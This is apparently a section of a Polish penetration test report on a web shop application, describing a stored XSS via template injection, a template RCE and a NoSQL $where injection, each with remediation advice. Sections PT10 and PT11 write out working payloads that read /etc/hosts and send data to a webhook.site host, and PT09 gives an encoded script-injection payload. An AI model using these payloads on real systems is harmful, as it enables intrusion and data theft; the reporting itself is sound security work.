\subsection{\colorbox{orange!80}{\parbox{\textwidth}{PT09-RCE-XSS: Atak Stored XSS wspierany przez RCE}}}

Atak ten jest rozwinięciem prób związanych z wykonaniem XSS z użyciem funkcji dodawania pseudonimu dla użytkownika. Element wyświetlający pseudonim w szablonie strony jest niepoprawnie zabezpieczony, co umożliwia wykonanie kodu JavaScript i wyświetlenie jego wyników. Pozwala to na wstawienie tagu script przy pomocy funkcji związanych z przetwarzaniem ciągów znaków tekstowych (m.in. użycie String.fromCharCode(60) dla '<' i 62 dla '>'). 

Powodzenie tego typu ataku stanowi dowód, że sanityzacja danych odbywa się tylko na etapie użytkownik -> baza, natomiast nie działa poprawnie na etapie baza -> zwracana strona.

Inne miejsca, w których został przetestowany atak RCE podobną metodą (wykorzystując szablony strony), ale się nie powiódł:
\begin{itemize}
    \item Opinie produktów
    \item Customer Feedback
    \item Rejestracja mailem \#\{2+2\}@mail.com
\end{itemize}

Ponadto, wykonanie ataku wymaga znajomości żetonu JWT użytkownika, dlatego sam atak XSS kiedy staje się możliwy do wykonania jest już trochę niepotrzebny, ponieważ atakujący i tak ma dostęp do konta, a sanityzacja pseudonimu w pozostałych modułach aplikacji działa poprawnie, co uniemożliwia atak na osoby postronne.

\subsubsection{Warunki wykonania ataku}
Atakujący musi posiadać poprawny token użytkownika i wykonać atak modyfikujący CSP na jego awatar.

\subsubsection{Szczegóły wykonania}

W danych zawartych w tabeli wysłany kod jest zwykłym połączeniem ciągów znaków i klamr uzyskanych funkcjami zamieniającymi kody unicode na właściwe znaki. Kod URL \%2B odpowiada znakowi dodawania '+'.

\begin{table}[H]
\begin{tabular}{|l|l|l|l|l|l|}
\hline
\rowcolor[HTML]{EFEFEF} 
\multicolumn{1}{|c|}{\cellcolor[HTML]{EFEFEF}\textbf{Metoda}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Końcówka}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Nagłowki}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Ciasteczka}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Dane}}                             & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Odpowiedź/wynik}} \\ \hline
POST                                                          & /profile                                        & \begin{tabular}[c]{@{}l@{}}Authentication \\ Bearer TOKEN \end{tabular}                                   & \begin{tabular}[c]{@{}l@{}}token: \\ TOKEN\end{tabular}                    & \begin{tabular}[c]{@{}l@{}}\{'username'='\#\{String.fromCharCode(60) \\ \%2B'script'\%2BString.fromCharCode(62)\%2B"alert('abc') \\ "\%2BString.fromCharCode(60)\%2B'/script'\%2BString.fromCharCode(62)\}'\}\end{tabular} & 302 /profile                               \\ \hline
\end{tabular}
\end{table}

\subsubsection{Skutki}
Po wykonaniu takiego zapytania wejście na profil użytkownika skutkuje wyświetleniem alertu przeglądarki, co potwierdza powodzenie ataku XSS. W podanym przykładzie atak był niegroźny jednak nic nie stoi na przeszkodzie by wykonać np. kradzież ciasteczek jak w przypadku Reflected XSS.

\subsubsection{Zalecenia}
Należy powtórzyć użyte przed wpisem do bazy mechanizmy sanityzacji XSS również przed wyświetlaniem danych.

\subsection{\colorbox{red!80}{\parbox{\textwidth}{PT10-RCE: Kradzież danych z serwera z użyciem RCE na szablonie}}}
\subsubsection{Opis}
Atak polegał na wykorzystaniu niezabezpieczonego mechanizmu wyświetlania pseudonimu do przeglądania plików systemowych kontenera. Wykorzystaną podatność stanowiła możliwość wstawienia pseudonimu w formie "\#\{kod\}", którą niezabezpieczony szablon interpretował jako kod do uruchomienia w środowisku kontenera.

\subsubsection{Warunki wykonania ataku}
Atakujący posiada jakikolwiek poprawny token. Atakujący wie jak użyć biblioteki do generacji witryny.

\subsubsection{Szczegóły wykonania}
Atak działa analogicznie do opisanego poprzednio wykorzystania RCE do uzyskania efektu XSS (PT09) - zmienia się tylko zawartość przesyłana jako nowy pseudonim. 

Przykładem jest podglądanie konfiguracji systemu korzystając z pseudonimu (kod wygenerowany częściowo z pomocą Copilot):
\begin{lstlisting}
    {'username': "#{require('https').get('https://webhook.site/3f406f22-779e-44a3-a7ce-05e9146aa009?data=' + encodeURIComponent(require('fs').readFileSync('/etc/hosts', 'utf8')));}"}
\end{lstlisting}
Wynikiem zapytania jest:
\begin{lstlisting}
    127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 169.254.1.2 host.containers.internal host.docker.internal 10.42.12.104 52102d4cdf52 naughty_mclean
\end{lstlisting}
Na tej podstawie można się dowiedzieć, że aplikacja działa w konterze i ma dostęp do sieci wewnętrznej kontenerów (sieć host.containers.internal). 

\subsubsection{Skutki}
Atakujący może \textbf{odczytywać dowolne informacje o plikach w systemie oraz ich zawartości}. Podane przykłady przedstawiają wykorzystanie tej możliwości do odczytu klucza premium oraz podejrzenia sieci wewnętrznej kontenera, które mogły by posłużyć do odkrycia kolejnych potencjalnych celów.

\subsubsection{Zalecenia}
Najprostszym rozwiązaniem jest bezpośrednie usunięcie fragmentu "\#\{" z początku tekstu. Takie podejście jest banalne, ale sprawia, że tekst już nie zostanie wykonany. 

\textbf{Uwaga!} Ważne, by taki mechanizm zaimplementować zarówno przed wpisem do bazy, jak i tuż przed przekazaniem do szablonu. Dzięki temu zminimalizowana zostanie szansa, że działające RCE , które dostanie się do bazy danych w jakiś inny sposób (np. przez SQL Injection) zostanie wykonane.

Bardziej profesjonalnym podejściem była by sanityzacja działająca analogicznie do parameter binding przy SQL Injection, czyli mechanizm upewniający się że tekst od użytkownika zostanie zinterpretowany jako ciąg znaków, a nie polecenie. Wymaga to użycia odpowiedniej biblioteki. Najlepiej, aby już sama biblioteka od szablonów domyślnie nie dopuszczała RCE (chyba, że programista sam się na to zdecyduje z pełną świadomością).

Propozycja poprawki w aplikacji (wersja prostsza, ponieważ nie udało się znaleźć odpowiedniej biblioteki):
\begin{lstlisting}
[...]
processed = processed.replace("#{", "")
[...]
\end{lstlisting}
gdzie processed to zmienna przechowująca pseudonim użytkownika przetworzony przez sanityzację XSS. Wspominając o sanityzacji warto zaznaczyć, że dzięki odpowiedniemu użyciu RCE udało się ominąć sanityzację XSS i wykonać skuteczny atak ponieważ aplikacja nie waliduje danych po odczycie z bazy. Jest to coś co zdecydowanie wymaga poprawy: walidacja zarówno przed wstawieniem do bazy, jak i przed wyświetleniem na stronie to jedna z podstaw!
  



\subsection{\colorbox{yellow!80}{\parbox{\textwidth}{PT11-NOSQL-RCE: Atak RCE z użyciem bazy NoSQL}}}

\subsubsection{Opis}
Niepoprawna sanityzacja danych przed wykorzystaniem komendy \$where w bazie NoSQL sprawia, że można wykonywać dodatkowe polecenia z użyciem JavaScript. Celem tego ataku była końcówka /rest/products/\{id\}/reviews, gdzie modyfikowanym parametrem było id. W zawartym przykładzie zapytanie sprawia, że baza wysyła zapytanie na podany adres webhook.

\subsubsection{Warunki wykonania ataku}
\textbf{Brak}. Atak nie wymaga logowania.

\subsubsection{Szczegóły wykonania}
W tabeli zawarte zostało żądanie realizujące atak.

\begin{table}[H]
\begin{tabular}{|l|l|l|l|l|l|}
\hline
\rowcolor[HTML]{EFEFEF} 
\multicolumn{1}{|c|}{\cellcolor[HTML]{EFEFEF}\textbf{Metoda}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Końcówka}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Nagłowki}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Ciasteczka}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Dane}}                             & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Odpowiedź/wynik}} \\ \hline
GET                                                          & 
\begin{tabular}[c]{@{}l@{}}
    \begin{lstlisting}
/rest/products/1\%20\%26\%26\%20fetch\ 
('https\%3A\%2F\%2Fwebhook.
site\%2F3f406f22-779e-44a3-a7ce-05e9146aa009'\)/reviews  
    \end{lstlisting}  
\end{tabular}
& - & - & - & 200             \\ \hline
\end{tabular}
\end{table}
Przed zamianą niektórych znaków na kody URL odpytywana końcówka wyglądała następująco: \begin{lstlisting}
    /rest/products/1 && fetch(...)/reviews
\end{lstlisting}

\subsubsection{Skutki}
Skutkiem takiego zapytania jest puste żądanie otrzymane po stronie webhook'a. Niestety (z perspektywy atakującego) kontekst polecenia \$where nie pozwala na wykorzystanie tej podatności do wyciągnięcia wartościowych danych, ponieważ wszystkie opinie i tak są dostępne. Nie można jednak ignorować tej podatności, ponieważ może posłużyć do innych nadużyć takich jak SSRF.

\subsubsection{Zalecenia}  

Poprawki niezbędne do naprawy tej podatności są tożsame z tymi, które miały by zapobiec NoSQL Injection. Te zalecenia zostały opisany dokładniej w sekcji poświęconej atakowi PT04, jednak warto wspomnieć, że jednym z preferowanych rozwiązań jest dodanie biblioteki sanityzującej dane dopasowanej do baz NoSQL (np. mongo-sanitize).
